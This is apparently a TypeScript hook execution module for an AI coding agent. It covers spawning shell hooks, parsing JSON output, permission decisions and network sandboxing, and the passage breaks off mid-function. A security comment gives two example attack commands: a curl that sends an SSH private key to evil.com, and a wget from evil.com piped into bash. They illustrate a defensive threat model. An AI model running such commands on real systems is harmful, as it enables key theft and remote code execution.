/**
 * Hook execution engine: subprocess spawning, output parsing, and JSON processing.
 * Depends on ./types.js for shared type definitions.
 */
import type { ChildProcess } from 'child_process'
import { EventEmitter } from 'events'
import { Readable, Writable } from 'stream'
import { pathExists } from '../file.js'
import { wrapSpawn, type ShellCommand } from '../ShellCommand.js'
import { TaskOutput } from '../task/TaskOutput.js'
import { getCwd } from '../cwd.js'
import { formatShellPrefixCommand } from '../bash/shellPrefix.js'
import { getHookEnvFilePath } from '../sessionEnvironment.js'
import { subprocessEnv } from '../subprocessEnv.js'
import { getPlatform } from '../platform.js'
import { findGitBashPath, windowsPathToPosixPath } from '../windowsPaths.js'
import { getCachedPowerShellPath } from '../shell/powershellDetection.js'
import { DEFAULT_HOOK_SHELL } from '../shell/shellProvider.js'
import { buildPowerShellArgs } from '../shell/powershellProvider.js'
import {
  loadPluginOptions,
  substituteUserConfigVariables,
} from '../plugins/pluginOptionsStorage.js'
import { getPluginDataDir } from '../plugins/pluginDirectories.js'
import { getProjectRoot, getOriginalCwd } from '../../bootstrap/state.js'
import {
  hookJSONOutputSchema,
  promptRequestSchema,
  type HookCallback,
  type PromptRequest,
  type PromptResponse,
  isAsyncHookJSONOutput,
  isSyncHookJSONOutput,
  type PermissionRequestResult,
} from '../../types/hooks.js'
import type {
  HookEvent,
  HookInput,
  HookJSONOutput,
  SyncHookJSONOutput,
  AsyncHookJSONOutput,
} from 'src/entrypoints/agentSdkTypes.js'
import type { HookCommand } from '../settings/types.js'
import type { ElicitResult } from '@modelcontextprotocol/sdk/types.js'
import { logForDebugging } from '../debug.js'
import { logForDiagnosticsNoPII } from '../diagLogs.js'
import { firstLineOf } from '../stringUtils.js'
import { SandboxManager } from '../sandbox/sandbox-adapter.js'
import { createCombinedAbortSignal } from '../combinedAbortSignal.js'
import { jsonStringify, jsonParse } from '../slowOperations.js'
import { errorMessage, getErrnoCode } from '../errors.js'
import { logError } from '../log.js'
import { registerPendingAsyncHook } from './AsyncHookRegistry.js'
import { enqueuePendingNotification } from '../messageQueueManager.js'
import { wrapInSystemReminder } from '../messages.js'
import {
  emitHookStarted,
  emitHookResponse,
  startHookProgressInterval,
} from './hookEvents.js'
import { createAttachmentMessage } from '../attachments.js'
import { execPromptHook } from './execPromptHook.js'
import { execAgentHook } from './execAgentHook.js'
import { execHttpHook } from './execHttpHook.js'
import type { Message } from '../../types/message.js'
import type { ToolUseContext } from '../../Tool.js'
import type { FunctionHook } from './sessionHooks.js'
import type { HookResult, ElicitationResponse } from './types.js'

export function executeInBackground({
  processId,
  hookId,
  shellCommand,
  asyncResponse,
  hookEvent,
  hookName,
  command,
  asyncRewake,
  pluginId,
}: {
  processId: string
  hookId: string
  shellCommand: ShellCommand
  asyncResponse: AsyncHookJSONOutput
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion'
  hookName: string
  command: string
  asyncRewake?: boolean
  pluginId?: string
}): boolean {
  if (asyncRewake) {
    // asyncRewake hooks bypass the registry entirely. On completion, if exit
    // code 2 (blocking error), enqueue as a task-notification so it wakes the
    // model via useQueueProcessor (idle) or gets injected mid-query via
    // queued_command attachments (busy).
    //
    // NOTE: We deliberately do NOT call shellCommand.background() here, because
    // it calls taskOutput.spillToDisk() which breaks in-memory stdout/stderr
    // capture (getStderr() returns '' in disk mode). The StreamWrappers stay
    // attached and pipe data into the in-memory TaskOutput buffers. The abort
    // handler already no-ops on 'interrupt' reason (user submitted a new
    // message), so the hook survives new prompts. A hard cancel (Escape) WILL
    // kill the hook via the abort handler, which is the desired behavior.
    void shellCommand.result.then(async result => {
      // result resolves on 'exit', but stdio 'data' events may still be
      // pending. Yield to I/O so the StreamWrapper data handlers drain into
      // TaskOutput before we read it.
      await new Promise(resolve => setImmediate(resolve))
      const stdout = await shellCommand.taskOutput.getStdout()
      const stderr = shellCommand.taskOutput.getStderr()
      shellCommand.cleanup()
      emitHookResponse({
        hookId,
        hookName,
        hookEvent,
        output: stdout + stderr,
        stdout,
        stderr,
        exitCode: result.code,
        outcome: result.code === 0 ? 'success' : 'error',
      })
      if (result.code === 2) {
        enqueuePendingNotification({
          value: wrapInSystemReminder(
            `Stop hook blocking error from command "${hookName}": ${stderr || stdout}`,
          ),
          mode: 'task-notification',
        })
      }
    })
    return true
  }

  // TaskOutput on the ShellCommand accumulates data — no stream listeners needed
  if (!shellCommand.background(processId)) {
    return false
  }

  registerPendingAsyncHook({
    processId,
    hookId,
    asyncResponse,
    hookEvent,
    hookName,
    command,
    shellCommand,
    pluginId,
  })

  return true
}

/**
 * Parse and validate a JSON string against the hook output Zod schema.
 * Returns the validated output or formatted validation errors.
 */
function validateHookJson(
  jsonString: string,
): { json: HookJSONOutput } | { validationError: string } {
  const parsed = jsonParse(jsonString)
  const validation = hookJSONOutputSchema().safeParse(parsed)
  if (validation.success) {
    logForDebugging('Successfully parsed and validated hook JSON output')
    return { json: validation.data }
  }
  const errors = validation.error.issues
    .map(err => `  - ${err.path.join('.')}: ${err.message}`)
    .join('\n')
  return {
    validationError: `Hook JSON output validation failed:\n${errors}\n\nThe hook's output was: ${jsonStringify(parsed, null, 2)}`,
  }
}

export function parseHookOutput(stdout: string): {
  json?: HookJSONOutput
  plainText?: string
  validationError?: string
} {
  const trimmed = stdout.trim()
  if (!trimmed.startsWith('{')) {
    logForDebugging('Hook output does not start with {, treating as plain text')
    return { plainText: stdout }
  }

  try {
    const result = validateHookJson(trimmed)
    if ('json' in result) {
      return result
    }
    // For command hooks, include the schema hint in the error message
    const errorMsg = `${result.validationError}\n\nExpected schema:\n${jsonStringify(
      {
        continue: 'boolean (optional)',
        suppressOutput: 'boolean (optional)',
        stopReason: 'string (optional)',
        decision: '"approve" | "block" (optional)',
        reason: 'string (optional)',
        systemMessage: 'string (optional)',
        hookSpecificOutput: {
          'for PreToolUse': {
            hookEventName: '"PreToolUse"',
            permissionDecision: '"allow" | "deny" | "ask" (optional)',
            permissionDecisionReason: 'string (optional)',
            updatedInput: 'object (optional) - Modified tool input to use',
          },
          'for UserPromptSubmit': {
            hookEventName: '"UserPromptSubmit"',
            additionalContext: 'string (required)',
          },
          'for PostToolUse': {
            hookEventName: '"PostToolUse"',
            additionalContext: 'string (optional)',
          },
        },
      },
      null,
      2,
    )}`
    logForDebugging(errorMsg)
    return { plainText: stdout, validationError: errorMsg }
  } catch (e) {
    logForDebugging(`Failed to parse hook output as JSON: ${e}`)
    return { plainText: stdout }
  }
}

export function parseHttpHookOutput(body: string): {
  json?: HookJSONOutput
  validationError?: string
} {
  const trimmed = body.trim()

  if (trimmed === '') {
    const validation = hookJSONOutputSchema().safeParse({})
    if (validation.success) {
      logForDebugging(
        'HTTP hook returned empty body, treating as empty JSON object',
      )
      return { json: validation.data }
    }
  }

  if (!trimmed.startsWith('{')) {
    const validationError = `HTTP hook must return JSON, but got non-JSON response body: ${trimmed.length > 200 ? trimmed.slice(0, 200) + '\u2026' : trimmed}`
    logForDebugging(validationError)
    return { validationError }
  }

  try {
    const result = validateHookJson(trimmed)
    if ('json' in result) {
      return result
    }
    logForDebugging(result.validationError)
    return result
  } catch (e) {
    const validationError = `HTTP hook must return valid JSON, but parsing failed: ${e}`
    logForDebugging(validationError)
    return { validationError }
  }
}

/** Typed representation of sync hook JSON output, matching the syncHookResponseSchema Zod schema. */
export interface TypedSyncHookOutput {
  continue?: boolean
  suppressOutput?: boolean
  stopReason?: string
  decision?: 'approve' | 'block'
  reason?: string
  systemMessage?: string
  hookSpecificOutput?:
    | {
        hookEventName: 'PreToolUse'
        permissionDecision?: 'ask' | 'deny' | 'allow' | 'passthrough'
        permissionDecisionReason?: string
        updatedInput?: Record<string, unknown>
        additionalContext?: string
      }
    | {
        hookEventName: 'UserPromptSubmit'
        additionalContext?: string
      }
    | {
        hookEventName: 'SessionStart'
        additionalContext?: string
        initialUserMessage?: string
        watchPaths?: string[]
      }
    | {
        hookEventName: 'Setup'
        additionalContext?: string
      }
    | {
        hookEventName: 'SubagentStart'
        additionalContext?: string
      }
    | {
        hookEventName: 'PostToolUse'
        additionalContext?: string
        updatedMCPToolOutput?: unknown
      }
    | {
        hookEventName: 'PostToolUseFailure'
        additionalContext?: string
      }
    | {
        hookEventName: 'PermissionDenied'
        retry?: boolean
      }
    | {
        hookEventName: 'Notification'
        additionalContext?: string
      }
    | {
        hookEventName: 'PermissionRequest'
        decision?: PermissionRequestResult
      }
    | {
        hookEventName: 'Elicitation'
        action?: 'accept' | 'decline' | 'cancel'
        content?: Record<string, unknown>
      }
    | {
        hookEventName: 'ElicitationResult'
        action?: 'accept' | 'decline' | 'cancel'
        content?: Record<string, unknown>
      }
    | {
        hookEventName: 'CwdChanged'
        watchPaths?: string[]
      }
    | {
        hookEventName: 'FileChanged'
        watchPaths?: string[]
      }
    | {
        hookEventName: 'WorktreeCreate'
        worktreePath: string
      }
}

export function processHookJSONOutput({
  json: rawJson,
  command,
  hookName,
  toolUseID,
  hookEvent,
  expectedHookEvent,
  stdout,
  stderr,
  exitCode,
  durationMs,
}: {
  json: SyncHookJSONOutput
  command: string
  hookName: string
  toolUseID: string
  hookEvent: HookEvent
  expectedHookEvent?: HookEvent
  stdout?: string
  stderr?: string
  exitCode?: number
  durationMs?: number
}): Partial<HookResult> {
  const result: Partial<HookResult> = {}

  // Cast to typed interface for type-safe property access
  const json = rawJson as TypedSyncHookOutput

  // At this point we know it's a sync response
  const syncJson = json

  // Handle common elements
  if (syncJson.continue === false) {
    result.preventContinuation = true
    if (syncJson.stopReason) {
      result.stopReason = syncJson.stopReason
    }
  }

  if (json.decision) {
    switch (json.decision) {
      case 'approve':
        result.permissionBehavior = 'allow'
        break
      case 'block':
        result.permissionBehavior = 'deny'
        result.blockingError = {
          blockingError: json.reason || 'Blocked by hook',
          command,
        }
        break
      default:
        // Handle unknown decision types as errors
        throw new Error(
          `Unknown hook decision type: ${json.decision}. Valid types are: approve, block`,
        )
    }
  }

  // Handle systemMessage field
  if (json.systemMessage) {
    result.systemMessage = json.systemMessage
  }

  // Handle PreToolUse specific
  if (
    json.hookSpecificOutput?.hookEventName === 'PreToolUse' &&
    json.hookSpecificOutput.permissionDecision
  ) {
    switch (json.hookSpecificOutput.permissionDecision) {
      case 'allow':
        result.permissionBehavior = 'allow'
        break
      case 'deny':
        result.permissionBehavior = 'deny'
        result.blockingError = {
          blockingError: json.reason || 'Blocked by hook',
          command,
        }
        break
      case 'ask':
        result.permissionBehavior = 'ask'
        break
      default:
        // Handle unknown decision types as errors
        throw new Error(
          `Unknown hook permissionDecision type: ${json.hookSpecificOutput.permissionDecision}. Valid types are: allow, deny, ask`,
        )
    }
  }
  if (result.permissionBehavior !== undefined && json.reason !== undefined) {
    result.hookPermissionDecisionReason = json.reason
  }

  // Handle hookSpecificOutput
  if (json.hookSpecificOutput) {
    // Validate hook event name matches expected if provided
    if (
      expectedHookEvent &&
      json.hookSpecificOutput.hookEventName !== expectedHookEvent
    ) {
      throw new Error(
        `Hook returned incorrect event name: expected '${expectedHookEvent}' but got '${json.hookSpecificOutput.hookEventName}'. Full stdout: ${jsonStringify(json, null, 2)}`,
      )
    }

    switch (json.hookSpecificOutput.hookEventName) {
      case 'PreToolUse':
        // Override with more specific permission decision if provided
        if (json.hookSpecificOutput.permissionDecision) {
          switch (json.hookSpecificOutput.permissionDecision) {
            case 'allow':
              result.permissionBehavior = 'allow'
              break
            case 'deny':
              result.permissionBehavior = 'deny'
              result.blockingError = {
                blockingError:
                  json.hookSpecificOutput.permissionDecisionReason ||
                  json.reason ||
                  'Blocked by hook',
                command,
              }
              break
            case 'ask':
              result.permissionBehavior = 'ask'
              break
          }
        }
        result.hookPermissionDecisionReason =
          json.hookSpecificOutput.permissionDecisionReason
        // Extract updatedInput if provided
        if (json.hookSpecificOutput.updatedInput) {
          result.updatedInput = json.hookSpecificOutput.updatedInput
        }
        // Extract additionalContext if provided
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'UserPromptSubmit':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'SessionStart':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        result.initialUserMessage = json.hookSpecificOutput.initialUserMessage
        if (
          'watchPaths' in json.hookSpecificOutput &&
          json.hookSpecificOutput.watchPaths
        ) {
          result.watchPaths = json.hookSpecificOutput.watchPaths
        }
        break
      case 'Setup':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'SubagentStart':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PostToolUse':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        // Extract updatedMCPToolOutput if provided
        if (json.hookSpecificOutput.updatedMCPToolOutput) {
          result.updatedMCPToolOutput =
            json.hookSpecificOutput.updatedMCPToolOutput
        }
        break
      case 'PostToolUseFailure':
        result.additionalContext = json.hookSpecificOutput.additionalContext
        break
      case 'PermissionDenied':
        result.retry = json.hookSpecificOutput.retry
        break
      case 'PermissionRequest':
        // Extract the permission request decision
        if (json.hookSpecificOutput.decision) {
          result.permissionRequestResult = json.hookSpecificOutput.decision
          // Also update permissionBehavior for consistency
          result.permissionBehavior =
            json.hookSpecificOutput.decision.behavior === 'allow'
              ? 'allow'
              : 'deny'
          if (
            json.hookSpecificOutput.decision.behavior === 'allow' &&
            json.hookSpecificOutput.decision.updatedInput
          ) {
            result.updatedInput = json.hookSpecificOutput.decision.updatedInput
          }
        }
        break
      case 'Elicitation':
        if (json.hookSpecificOutput.action) {
          result.elicitationResponse = {
            action: json.hookSpecificOutput.action,
            content: json.hookSpecificOutput.content as
              | ElicitationResponse['content']
              | undefined,
          }
          if (json.hookSpecificOutput.action === 'decline') {
            result.blockingError = {
              blockingError: json.reason || 'Elicitation denied by hook',
              command,
            }
          }
        }
        break
      case 'ElicitationResult':
        if (json.hookSpecificOutput.action) {
          result.elicitationResultResponse = {
            action: json.hookSpecificOutput.action,
            content: json.hookSpecificOutput.content as
              | ElicitationResponse['content']
              | undefined,
          }
          if (json.hookSpecificOutput.action === 'decline') {
            result.blockingError = {
              blockingError:
                json.reason || 'Elicitation result blocked by hook',
              command,
            }
          }
        }
        break
    }
  }

  return {
    ...result,
    message: result.blockingError
      ? createAttachmentMessage({
          type: 'hook_blocking_error',
          hookName,
          toolUseID,
          hookEvent,
          blockingError: result.blockingError,
        })
      : createAttachmentMessage({
          type: 'hook_success',
          hookName,
          toolUseID,
          hookEvent,
          // JSON-output hooks inject context via additionalContext →
          // hook_additional_context, not this field. Empty content suppresses
          // the trivial "X hook success: Success" system-reminder that
          // otherwise pollutes every turn (messages.ts:3577 skips on '').
          content: '',
          stdout,
          stderr,
          exitCode,
          command,
          durationMs,
        }),
  }
}

/**
 * Execute a command-based hook using bash or PowerShell.
 *
 * Shell resolution: hook.shell -> 'bash'. PowerShell hooks spawn pwsh
 * with -NoProfile -NonInteractive -Command and skip bash-specific prep
 * (POSIX path conversion, .sh auto-prepend, CLAUDE_CODE_SHELL_PREFIX).
 * See docs/design/ps-shell-selection.md S5.1.
 */
export async function execCommandHook(
  hook: HookCommand & { type: 'command' },
  hookEvent: HookEvent | 'StatusLine' | 'FileSuggestion',
  hookName: string,
  jsonInput: string,
  signal: AbortSignal,
  hookId: string,
  hookIndex?: number,
  pluginRoot?: string,
  pluginId?: string,
  skillRoot?: string,
  forceSyncExecution?: boolean,
  requestPrompt?: (request: PromptRequest) => Promise<PromptResponse>,
): Promise<{
  stdout: string
  stderr: string
  output: string
  status: number
  aborted?: boolean
  backgrounded?: boolean
}> {
  // Gated to once-per-session events to keep diag_log volume bounded.
  // started/completed live inside the try/finally so setup-path throws
  // don't orphan a started marker — that'd be indistinguishable from a hang.
  const shouldEmitDiag =
    hookEvent === 'SessionStart' ||
    hookEvent === 'Setup' ||
    hookEvent === 'SessionEnd'
  const diagStartMs = Date.now()
  let diagExitCode: number | undefined
  let diagAborted = false

  const isWindows = getPlatform() === 'windows'

  // --
  // Per-hook shell selection (phase 1 of docs/design/ps-shell-selection.md).
  // Resolution order: hook.shell -> DEFAULT_HOOK_SHELL. The defaultShell
  // fallback (settings.defaultShell) is phase 2 — not wired yet.
  //
  // The bash path is the historical default and stays unchanged. The
  // PowerShell path deliberately skips the Windows-specific bash
  // accommodations (cygpath conversion, .sh auto-prepend, POSIX-quoted
  // SHELL_PREFIX).
  const shellType = hook.shell ?? DEFAULT_HOOK_SHELL

  const isPowerShell = shellType === 'powershell'

  // --
  // Windows bash path: hooks run via Git Bash (Cygwin), NOT cmd.exe.
  //
  // This means every path we put into env vars or substitute into the command
  // string MUST be a POSIX path (/c/Users/foo), not a Windows path
  // (C:\Users\foo or C:/Users/foo). Git Bash cannot resolve Windows paths.
  //
  // windowsPathToPosixPath() is pure-JS regex conversion (no cygpath shell-out):
  // C:\Users\foo -> /c/Users/foo, UNC preserved, slashes flipped. Memoized
  // (LRU-500) so repeated calls are cheap.
  //
  // PowerShell path: use native paths — skip the conversion entirely.
  // PowerShell expects Windows paths on Windows (and native paths on
  // Unix where pwsh is also available).
  const toHookPath =
    isWindows && !isPowerShell
      ? (p: string) => windowsPathToPosixPath(p)
      : (p: string) => p

  // Set CLAUDE_PROJECT_DIR to the stable project root (not the worktree path).
  // getProjectRoot() is never updated when entering a worktree, so hooks that
  // reference $CLAUDE_PROJECT_DIR always resolve relative to the real repo root.
  const projectDir = getProjectRoot()

  // Substitute ${CLAUDE_PLUGIN_ROOT} and ${user_config.X} in the command string.
  // Order matches MCP/LSP (plugin vars FIRST, then user config) so a user-
  // entered value containing the literal text ${CLAUDE_PLUGIN_ROOT} is treated
  // as opaque — not re-interpreted as a template.
  let command = hook.command
  let pluginOpts: ReturnType<typeof loadPluginOptions> | undefined
  if (pluginRoot) {
    // Plugin directory gone (orphan GC race, concurrent session deleted it):
    // throw so callers yield a non-blocking error. Running would fail — and
    // `python3 <missing>.py` exits 2, the hook protocol's "block" code, which
    // bricks UserPromptSubmit/Stop until restart. The pre-check is necessary
    // because exit-2-from-missing-script is indistinguishable from an
    // intentional block after spawn.
    if (!(await pathExists(pluginRoot))) {
      throw new Error(
        `Plugin directory does not exist: ${pluginRoot}` +
          (pluginId ? ` (${pluginId} — run /plugin to reinstall)` : ''),
      )
    }
    // Inline both ROOT and DATA substitution instead of calling
    // substitutePluginVariables(). That helper normalizes \ -> / on Windows
    // unconditionally — correct for bash (toHookPath already produced /c/...
    // so it's a no-op) but wrong for PS where toHookPath is identity and we
    // want native C:\... backslashes. Inlining also lets us use the function-
    // form .replace() so paths containing $ aren't mangled by $-pattern
    // interpretation (rare but possible: \\server\c$\plugin).
    const rootPath = toHookPath(pluginRoot)
    command = command.replace(/\$\{CLAUDE_PLUGIN_ROOT\}/g, () => rootPath)
    if (pluginId) {
      const dataPath = toHookPath(getPluginDataDir(pluginId))
      command = command.replace(/\$\{CLAUDE_PLUGIN_DATA\}/g, () => dataPath)
    }
    if (pluginId) {
      pluginOpts = loadPluginOptions(pluginId)
      // Throws if a referenced key is missing — that means the hook uses a key
      // that's either not declared in manifest.userConfig or not yet configured.
      // Caught upstream like any other hook exec failure.
      command = substituteUserConfigVariables(command, pluginOpts)
    }
  }

  // On Windows (bash only), auto-prepend `bash` for .sh scripts so they
  // execute instead of opening in the default file handler. PowerShell
  // runs .ps1 files natively — no prepend needed.
  if (isWindows && !isPowerShell && command.trim().match(/\.sh(\s|$|")/)) {
    if (!command.trim().startsWith('bash ')) {
      command = `bash ${command}`
    }
  }

  // CLAUDE_CODE_SHELL_PREFIX wraps the command via POSIX quoting
  // (formatShellPrefixCommand uses shell-quote). This makes no sense for
  // PowerShell — see design S8.1. For now PS hooks ignore the prefix;
  // a CLAUDE_CODE_PS_SHELL_PREFIX (or shell-aware prefix) is a follow-up.
  const finalCommand =
    !isPowerShell && process.env.CLAUDE_CODE_SHELL_PREFIX
      ? formatShellPrefixCommand(process.env.CLAUDE_CODE_SHELL_PREFIX, command)
      : command

  const hookTimeoutMs = hook.timeout ? hook.timeout * 1000 : 10 * 60 * 1000

  // Build env vars — all paths go through toHookPath for Windows POSIX conversion
  const envVars: NodeJS.ProcessEnv = {
    ...subprocessEnv(),
    CLAUDE_PROJECT_DIR: toHookPath(projectDir),
  }

  // Plugin and skill hooks both set CLAUDE_PLUGIN_ROOT (skills use the same
  // name for consistency — skills can migrate to plugins without code changes)
  if (pluginRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(pluginRoot)
    if (pluginId) {
      envVars.CLAUDE_PLUGIN_DATA = toHookPath(getPluginDataDir(pluginId))
    }
  }
  // Expose plugin options as env vars too, so hooks can read them without
  // ${user_config.X} in the command string. Sensitive values included — hooks
  // run the user's own code, same trust boundary as reading keychain directly.
  if (pluginOpts) {
    for (const [key, value] of Object.entries(pluginOpts)) {
      // Sanitize non-identifier chars (bash can't ref $FOO-BAR). The schema
      // at schemas.ts:611 now constrains keys to /^[A-Za-z_]\w*$/ so this is
      // belt-and-suspenders, but cheap insurance if someone bypasses the schema.
      const envKey = key.replace(/[^A-Za-z0-9_]/g, '_').toUpperCase()
      envVars[`CLAUDE_PLUGIN_OPTION_${envKey}`] = String(value)
    }
  }
  if (skillRoot) {
    envVars.CLAUDE_PLUGIN_ROOT = toHookPath(skillRoot)
  }

  // CLAUDE_ENV_FILE points to a .sh file that the hook writes env var
  // definitions into; getSessionEnvironmentScript() concatenates them and
  // bashProvider injects the content into bash commands. A PS hook would
  // naturally write PS syntax ($env:FOO = 'bar'), which bash can't parse.
  // Skip for PS — consistent with how .sh prepend and SHELL_PREFIX are
  // already bash-only above.
  if (
    !isPowerShell &&
    (hookEvent === 'SessionStart' ||
      hookEvent === 'Setup' ||
      hookEvent === 'CwdChanged' ||
      hookEvent === 'FileChanged') &&
    hookIndex !== undefined
  ) {
    envVars.CLAUDE_ENV_FILE = await getHookEnvFilePath(hookEvent, hookIndex)
  }

  // When agent worktrees are removed, getCwd() may return a deleted path via
  // AsyncLocalStorage. Validate before spawning since spawn() emits async
  // 'error' events for missing cwd rather than throwing synchronously.
  const hookCwd = getCwd()
  const safeCwd = (await pathExists(hookCwd)) ? hookCwd : getOriginalCwd()
  if (safeCwd !== hookCwd) {
    logForDebugging(
      `Hooks: cwd ${hookCwd} not found, falling back to original cwd`,
      { level: 'warn' },
    )
  }

  // --
  // Spawn. Two completely separate paths:
  //
  //   Bash: spawn(cmd, [], { shell: <gitBashPath | true> }) — the shell
  //   option makes Node pass the whole string to the shell for parsing.
  //
  //   PowerShell: spawn(pwshPath, ['-NoProfile', '-NonInteractive',
  //   '-Command', cmd]) — explicit argv, no shell option. -NoProfile
  //   skips user profile scripts (faster, deterministic).
  //   -NonInteractive fails fast instead of prompting.
  //
  // The Git Bash hard-exit in findGitBashPath() is still in place for
  // bash hooks. PowerShell hooks never call it, so a Windows user with
  // only pwsh and shell: 'powershell' on every hook could in theory run
  // without Git Bash — but init.ts still calls setShellIfWindows() on
  // startup, which will exit first. Relaxing that is phase 1 of the
  // design's implementation order (separate PR).

  // SECURITY: Apply network-only sandbox to hook commands when sandboxing is enabled.
  // Hooks execute arbitrary shell commands from settings.json without going
  // through the Bash tool's permission prompt. Unlike the full Bash sandbox,
  // hooks only get network restrictions (not filesystem restrictions) because:
  //   - Legitimate hooks (formatters, linters, type checkers) need full
  //     filesystem access to read/write project files
  //   - The core threat from malicious hooks is data exfiltration (e.g.
  //     `curl http://evil.com?key=$(cat ~/.ssh/id_rsa)`) and payload download
  //     (e.g. `wget http://evil.com/malware.sh | bash`)
  //   - Hooks that genuinely need network (notifications) should use the
  //     `http` hook type, which is not affected by this sandbox
  let sandboxedCommand = finalCommand
  if (!isPowerShell && SandboxManager.isSandboxingEnabled()) {
    try {
      sandboxedCommand = await SandboxManager.wrapWithSandbox(
        finalCommand,
        undefined, // use default shell
        {
          // Network: deny all outbound by default. Hooks that need network
          // should use the `http` hook type instead of shell commands.
          network: {
            allowedDomains: [],
            deniedDomains: [],
          },
          // Filesystem: no additional restrictions beyond sandbox defaults.
          // Hooks need to read/write project files freely (e.g. prettier --write).
          filesystem: {
            allowWrite: ['/'],
            denyWrite: [],
            allowRead: [],
            denyRead: [],
          },
        },
        signal,
      )
      logForDebugging(
        `Hook command sandboxed (network-only): ${hook.command}`,
        { level: 'verbose' },
      )
    } catch (sandboxError) {
      // If sandbox wrapping fails, log and continue without sandbox.
      // This preserves backwards compatibility — hooks that ran before
      // sandbox support was added will still work.
      logForDebugging(
        `Failed to sandbox hook command, running unsandboxed: ${errorMessage(sandboxError)}`,
        { level: 'warn' },
      )
    }
  }

  let spawnArgs: string[]
  if (shellType === 'powershell') {
    const pwshPath = await getCachedPowerShellPath()
    if (!pwshPath) {
      throw new Error(
        `Hook "${hook.command}" has shell: 'powershell' but no PowerShell ` +
          `executable (pwsh or powershell) was found on PATH. Install ` +
          `PowerShell, or remove "shell": "powershell" to use bash.`,
      )
    }
    spawnArgs = [pwshPath, ...buildPowerShellArgs(finalCommand)]
  } else {
    // On Windows, use Git Bash explicitly (cmd.exe can't run bash syntax).
    // On other platforms, use /bin/sh -c (replaces shell: true).
    const shellBin = isWindows ? findGitBashPath() : '/bin/sh'
    spawnArgs = [shellBin, '-c', sandboxedCommand]
  }

  const proc = Bun.spawn(spawnArgs, {
    env: envVars as Record<string, string | undefined>,
    cwd: safeCwd,
    stdin: 'pipe',
    stdout: 'pipe',
    stderr: 'pipe',
  })

  // Adapt Bun.Subprocess into ChildProcess-compatible interface for wrapSpawn
  const emitter = new EventEmitter()
  proc.exited.then(
    code => {
      emitter.emit('exit', code, null)
      emitter.emit('close', code, null)
    },
    err => {
      emitter.emit('error', err)
    },
  )
  const adaptedStdout = Readable.fromWeb(
    proc.stdout as unknown as import('stream/web').ReadableStream,
  )
  const adaptedStderr = Readable.fromWeb(
    proc.stderr as unknown as import('stream/web').ReadableStream,
  )
  const fileSink = proc.stdin!
  const adaptedStdin = new Writable({
    write(chunk, _encoding, callback) {
      try {
        fileSink.write(typeof chunk === 'string' ? chunk : chunk)
        callback()
      } catch (err) {
        callback(err as Error)
      }
    },
    final(callback) {
      try {
        fileSink.end()
        callback()
      } catch (err) {
        callback(err as Error)
      }
    },
    destroy(err, callback) {
      try {
        fileSink.end()
      } catch {
        /* already closed */
      }
      callback(err)
    },
  })
  let procKilled = false
  const child = Object.assign(emitter, {
    pid: proc.pid,
    stdout: adaptedStdout,
    stderr: adaptedStderr,
    stdin: adaptedStdin,
    get killed() {
      return procKilled
    },
    set killed(v: boolean) {
      procKilled = v
    },
    kill(signal?: NodeJS.Signals | number): boolean {
      procKilled = true
      proc.kill(signal as number)
      return true
    },
  }) as unknown as ChildProcess & {
    stdout: Readable
    stderr: Readable
    stdin: Writable
  }

  // Hooks use pipe mode — stdout must be streamed into JS so we can parse
  // the first response line to detect async hooks ({"async": true}).
  const hookTaskOutput = new TaskOutput(`hook_${child.pid}`, null)
  const shellCommand = wrapSpawn(child, signal, hookTimeoutMs, hookTaskOutput)
  // Track whether shellCommand ownership was transferred (e.g., to async hook registry)
  let shellCommandTransferred = false
  // Track whether stdin has already been written (to avoid "write after end" errors)
  let stdinWritten = false

  if ((hook.async || hook.asyncRewake) && !forceSyncExecution) {
    const processId = `async_hook_${child.pid}`
    logForDebugging(
      `Hooks: Config-based async hook, backgrounding process ${processId}`,
    )

    // Write stdin before backgrounding so the hook receives its input.
    // The trailing newline matches the sync path (L1000). Without it,
    // bash `read -r line` returns exit 1 (EOF before delimiter) — the
    // variable IS populated but `if read -r line; then ...` skips the
    // branch. See gh-30509 / CC-161.
    child.stdin.write(jsonInput + '\n', 'utf8')
    child.stdin.end()
    stdinWritten = true

    const backgrounded = executeInBackground({
      processId,
      hookId,
      shellCommand,
      asyncResponse: { async: true, asyncTimeout: hookTimeoutMs },
      hookEvent,
      hookName,
      command: hook.command,
      asyncRewake: hook.asyncRewake,
      pluginId,
    })
    if (backgrounded) {
      return {
        stdout: '',
        stderr: '',
        output: '',
        status: 0,
        backgrounded: true,
      }
    }
  }

  let stdout = ''
  let stderr = ''
  let output = ''

  // Set up output data collection with explicit UTF-8 encoding
  child.stdout.setEncoding('utf8')
  child.stderr.setEncoding('utf8')

  let initialResponseChecked = false

  let asyncResolve:
    | ((result: {
        stdout: string
        stderr: string
        output: string
        status: number
      }) => void)
    | null = null
  const childIsAsyncPromise = new Promise<{
    stdout: string
    stderr: string
    output: string
    status: number
    aborted?: boolean
  }>(resolve => {
    asyncResolve = resolve
  })

  // Track trimmed prompt-request lines we processed so we can strip them
  // from final stdout by content match (no index tracking -> no index drift)
  const processedPromptLines = new Set<string>()
  // Serialize async prompt handling so responses are sent in order
  let promptChain = Promise.resolve()
  // Line buffer for detecting prompt requests in streaming output
  let lineBuffer = ''

  child.stdout.on('data', data => {
    stdout += data
    output += data

    // When requestPrompt is provided, parse stdout line-by-line for prompt requests
    if (requestPrompt) {
      lineBuffer += data
      const lines = lineBuffer.split('\n')
      lineBuffer = lines.pop() ?? '' // last element is an incomplete line

      for (const line of lines) {
        const trimmed = line.trim()
        if (!trimmed) continue

        try {
          const parsed = jsonParse(trimmed)
          const validation = promptRequestSchema().safeParse(parsed)
          if (validation.success) {
            processedPromptLines.add(trimmed)
            logForDebugging(
              `Hooks: Detected prompt request from hook: ${trimmed}`,
            )
            // Chain the async handling to serialize prompt responses
            const promptReq = validation.data
            const reqPrompt = requestPrompt
            promptChain = promptChain.then(async () => {
              try {
                const response = await reqPrompt(promptReq)
                child.stdin.write(jsonStringify(response) + '\n', 'utf8')
              } catch (err) {
                logForDebugging(`Hooks: Prompt request handling failed: ${err}`)
                // User cancelled or prompt failed — close stdin so the hook
                // process doesn't hang waiting for input
                child.stdin.destroy()
              }
            })
          }
        } catch {
          // Not JSON, just a normal line
        }
      }
    }

